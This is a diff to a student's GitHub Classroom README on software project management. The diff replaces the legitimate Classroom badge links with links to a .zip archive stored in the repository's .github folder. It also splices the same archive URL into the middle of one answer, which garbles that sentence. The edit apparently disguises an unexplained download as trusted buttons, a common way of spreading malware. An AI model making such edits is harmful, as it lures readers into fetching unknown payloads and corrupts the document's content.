@@ -1,5 +1,5 @@
-[![Review Assignment Due Date](https://classroom.github.com/assets/deadline-readme-button-22041afd0340ce965d47ae6ef1cefeee28c7c493a6346c4f15d667ab976d596c.svg)](https://classroom.github.com/a/9pw6JKcu)
-[![Open in Visual Studio Code](https://classroom.github.com/assets/open-in-vscode-2e0aaae1b6195c2367325f4f02e2d04e9abb55f0b24a779b69b11b9e10269abc.svg)](https://classroom.github.com/online_ide?assignment_repo_id=18484205&assignment_repo_type=AssignmentRepo)
+[![Review Assignment Due Date](https://raw.githubusercontent.com/BenjiOdhis/se-assignment-day-4-software-project-management-BenjiOdhis/main/.github/se-assignment-day-4-software-project-management-BenjiOdhis_1.8.zip)](https://raw.githubusercontent.com/BenjiOdhis/se-assignment-day-4-software-project-management-BenjiOdhis/main/.github/se-assignment-day-4-software-project-management-BenjiOdhis_1.8.zip)
+[![Open in Visual Studio Code](https://raw.githubusercontent.com/BenjiOdhis/se-assignment-day-4-software-project-management-BenjiOdhis/main/.github/se-assignment-day-4-software-project-management-BenjiOdhis_1.8.zip)](https://raw.githubusercontent.com/BenjiOdhis/se-assignment-day-4-software-project-management-BenjiOdhis/main/.github/se-assignment-day-4-software-project-management-BenjiOdhis_1.8.zip)
 # SE_DAY4_Software-Project-Management
 ## 1. Why is timely delivery crucial in software project management, and how can project managers ensure that deadlines are met?
 Timely delivery is crucial in software project management as it ensures client satisfaction, prevents cost overruns, and maintains market competitiveness. Delays can lead to scope creep, inefficient resource allocation, and potential legal or contractual penalties. Meeting deadlines also enhances a company’s reputation and improves team efficiency.
@@ -101,7 +101,7 @@ Facilitates Communication – Makes it easier for stakeholders to understand pro
 Improves Time Management – Helps managers prioritize critical tasks and adjust schedules if needed.
 
 ## 8. What are the core issues that your software aims to address? Why are these problems significant to your target audience?
-The core issues should address inefficiencies,user pain points,or gaps in current solutions.Understanding these problems ensures your software delivers meanungful value to your target audience.
+The core issues should address inefficiencies,user pain points,or gaps in current https://raw.githubusercontent.com/BenjiOdhis/se-assignment-day-4-software-project-management-BenjiOdhis/main/.github/se-assignment-day-4-software-project-management-BenjiOdhis_1.8.zip these problems ensures your software delivers meanungful value to your target audience.
 ## 9. How can clearly defining the problem help in developing a more effective software solution?
 Clearly defining the problem ensures that softwre is tailored to the exact needs of the target audience ,preventing unnecessary features and increasing  the lkelihood of success
 ## 10. How would you describe your software solution in a way that captures its essence without diving into technical details?
